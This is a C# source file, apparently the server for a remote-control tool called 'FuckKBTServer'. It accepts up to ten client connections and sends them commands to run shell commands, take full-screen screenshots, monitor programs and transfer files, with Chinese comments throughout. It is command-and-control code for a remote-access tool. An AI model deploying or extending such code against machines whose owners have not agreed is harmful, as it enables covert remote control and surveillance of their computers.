using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

/*
 * 服务器命令:clients(查看已经连接的客户端)
 *           all+cmd(群发消息)
 *           
 * 可发送给客户端的指令:
                      runcmd(运行cmd命令)
                      scrshot(截全屏)
                      listen(监听某个程序)
                      Pulse(心跳包)
 * 
 * 
 */

namespace FuckKBTServer
{
    class Program
    {
        public static long comPressLevel = 70;
        public static Dictionary<int, DialogToClient> Clients = new Dictionary<int, DialogToClient> { };
        static void Main(string[] args)
        {

            Console.WriteLine("请输入压缩比0-100 > ");
            comPressLevel = long.Parse(Console.ReadLine());
            IPEndPoint endpoint = new IPEndPoint(IPAddress.Any, 4419);
            Socket server = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            server.Bind(endpoint);
            Console.WriteLine("请输入压缩比侦听数 > ");
            int listen_num = int.Parse(Console.ReadLine());
            server.Listen(listen_num);
            DateTime now1 = DateTime.Now;
            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"服务器已经启动", now1.Year, now1.Month, now1.Day, now1.Hour, now1.Minute, now1.Second);
            //启动服务器命令行
            Thread cmd = new Thread(new ThreadStart(ServerCMD));
            //启动心跳包
            Thread PulseThread = new Thread(new ThreadStart(Pulse));
            PulseThread.Start();
            //启动手机端服务器接纳
            Thread phoneThread = new Thread(new ThreadStart(phoneStart));
            phoneThread.Start();

            cmd.Start();
            while (true)
            {
                try
                {
                    DateTime now = DateTime.Now;
                    Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"----开始侦听----", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                    Socket socketClient = server.Accept();
                    
                    Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"----接入成功----", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                    DialogToClient dtc = new DialogToClient(socketClient);
                    int l = findNonCreateNumber();
                    if (l == -1)
                    {
                        Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"----接入已经达到最大值,即将断开连接----", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        socketClient.Close();
                        continue;
                    }
                    dtc.name = l;
                    Clients.Add(l, dtc);

                }
                catch (Exception)
                {
                    continue;
                }
            }
        }

        static void phoneStart()
        {
            ProgramPhone.startListenPhoneClients();
        }

        static void Pulse()
        {
            while (true)
            {
                try
                {
                    foreach (KeyValuePair<int, DialogToClient> clients in Clients)
                    {
                        try
                        {
                            clients.Value.holdToSend = "Pulse";
                            clients.Value.send();
                        }
                        catch (Exception)
                        {
                            clients.Value.client.Close();
                            try
                            {
                                DisconnectClient(clients.Value.name);
                                clients.Value.client.Close();
                            }
                            catch (Exception) { }
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"----" + clients.Value.name + "断开连接----", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        }

                    }
                }
                catch (Exception) { }
                
                Thread.Sleep(3000);
            }
        }


        static int findNonCreateNumber()
        {
            for(int i = 1; i <= 10; i++)
            {
                DialogToClient s;
                if(!Clients.TryGetValue(i,out s))
                {
                    return i;
                }
            }
            return -1;
        }

        public static void sendToDialogs(string n)
        {
            //以?分割字符串
            string[] sp = n.Split('?');
            string[] grouped = Regroup(sp);

            if (!grouped[0].Equals("runcmd") && !grouped[0].Equals("scrshot") && !grouped[0].Equals("listen"))
            {
                if (grouped[0].Equals("clients"))
                {
                    DateTime now = DateTime.Now;
                    Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] ", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                    Console.WriteLine("----------------------");
                    //查看客户端列表
                    foreach (KeyValuePair<int, DialogToClient> keys in Clients)
                    {
                        Console.WriteLine(keys.Key + "->" + keys.Value.client.RemoteEndPoint);
                    }
                    Console.WriteLine("----------------------");
                }
                else if (grouped[0].Equals("all"))
                {
                    //群发消息
                    foreach (KeyValuePair<int, DialogToClient> keys in Clients)
                    {
                        keys.Value.holdToSend = grouped[1];
                        keys.Value.send();
                    }
                }
                else if (grouped[0].Equals("close"))
                {
                    try
                    {
                        //关闭连接 TOOD
                        DialogToClient dtc;
                        var i = Clients.TryGetValue(int.Parse(grouped[1]), out dtc);
                        if (i)
                        {
                            DisconnectClient(int.Parse(grouped[1]));
                            dtc.client.Close();
                        }
                        else
                        {
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"找不到对应的编号", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        }

                    }
                    catch (Exception ex)
                    {
                        DateTime now = DateTime.Now;
                        Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"发生错误" + ex.ToString(), now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                    }


                }
                else
                {
                    try
                    {
                        //发送至客户端命令
                        DialogToClient s;
                        bool finded = Clients.TryGetValue(int.Parse(grouped[0]), out s);
                        if (!finded)
                        {
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"----没有找到对应的编号----", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        }
                        s.holdToSend = grouped[1];
                        s.send();
                    }
                    catch (Exception ex)
                    {
                        DateTime now = DateTime.Now;
                        Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"输入的格式不对", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                    }

                }



            }
        }

        static void ServerCMD()
        {
            while (true)
            {
                string n = Console.ReadLine();
                string[] sp = n.Split('?');
                string[] grouped = Regroup(sp);
                string[] args = grouped[1].Split('?');

                if (!grouped[0].Equals("runcmd") && !grouped[0].Equals("scrshot") && !grouped[0].Equals("listen"))
                {
                    if (grouped[0].Equals("clients"))
                    {
                        DateTime now = DateTime.Now;
                        Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] ", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        Console.WriteLine("----------------------");
                        //查看客户端列表
                        foreach (KeyValuePair<int, DialogToClient> keys in Clients)
                        {
                            Console.WriteLine(keys.Key + "->" + keys.Value.client.RemoteEndPoint);
                        }
                        Console.WriteLine("----------------------");
                    } else if (grouped[0].Equals("all"))
                    {
                        //群发消息
                        foreach (KeyValuePair<int, DialogToClient> keys in Clients)
                        {
                            keys.Value.holdToSend = grouped[1];
                            keys.Value.send();
                        }
                    }
                    else if (grouped[0].Equals("close"))
                    {
                        try
                        {
                            DialogToClient dtc;
                            var i = Clients.TryGetValue(int.Parse(grouped[1]), out dtc);
                            if (i)
                            {
                                DisconnectClient(int.Parse(grouped[1]));
                                dtc.client.Close();
                            }
                            else
                            {
                                DateTime now = DateTime.Now;
                                Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"找不到对应的编号", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                            }

                        } catch (Exception ex)
                        {
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"发生错误" + ex.ToString(), now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        }


                    } else if (args[0].Equals("scp"))
                    {

                        if (args.Length == 3)
                        {
                            //TODO:文件下载命令
                            DialogToClient s;
                            bool finded = Clients.TryGetValue(int.Parse(grouped[0]), out s);
                            if (!finded)
                            {
                                DateTime now = DateTime.Now;
                                Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"----没有找到对应的编号----", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                                continue;
                            }
                            s.send(grouped[1], null);
                        }
                        else
                        {
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"参数不足", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        }
                        
                    }
                    else if (args[0].Equals("upload"))
                    {
                        if (args.Length == 3)
                        {
                            //TODO:文件上传命令
                            DialogToClient s;
                            bool finded = Clients.TryGetValue(int.Parse(grouped[0]), out s);
                            if (!finded)
                            {
                                DateTime nowe = DateTime.Now;
                                Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] " + "----没有找到对应的编号----", nowe.Year, nowe.Month, nowe.Day, nowe.Hour, nowe.Minute, nowe.Second);
                                continue;
                            }
                            if (!File.Exists(args[1]))
                            {
                                DateTime nowk = DateTime.Now;
                                Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"文件不存在!", nowk.Year, nowk.Month, nowk.Day, nowk.Hour, nowk.Minute, nowk.Second);
                                continue;
                            }
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"向Client {6}发送文件成功", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second, grouped[0]);
                            try
                            {
                                s.send(grouped[1], args[1]);
                            }catch(Exception ex)
                            {
                                Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"发送失败,原因:" + ex.Message, now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                            }
                            
                        }
                        else
                        {
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"参数不足", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        }
                        
                    }
                    else
                    {
                        try
                        {
                            //发送至客户端命令
                            DialogToClient s;
                            bool finded = Clients.TryGetValue(int.Parse(grouped[0]), out s);
                            if (!finded)
                            {
                                DateTime now = DateTime.Now;
                                Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"----没有找到对应的编号----", now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                                continue;
                            }
                            s.holdToSend = grouped[1];
                            s.send();
                        }
                        catch(Exception ex)
                        {
                            DateTime now = DateTime.Now;
                            Console.WriteLine("[{0}/{1}/{2} {3}:{4}:{5}] "+"输入的格式不对 " +ex.Message, now.Year, now.Month, now.Day, now.Hour, now.Minute, now.Second);
                        }
                        
                    }
                    

                    
                }
            }
        }

        static string[] Regroup(string[] arg)
        {
            string second = "";
            for(int i = 1; i < arg.Length; i++)
            {
                if (i == 1)
                    second += arg[i];
                else
                    second += "?" + arg[i];
            }
            string[] regrouped = { arg[0], second };
            return regrouped;
        }

        static void SendToAllClient(string msg)
        {

        }

        public static void DisconnectClient(int name)
        {
            object objThis = new object();
            lock (objThis)
            {
                Clients.Remove(name);
            }
        }
    }
}
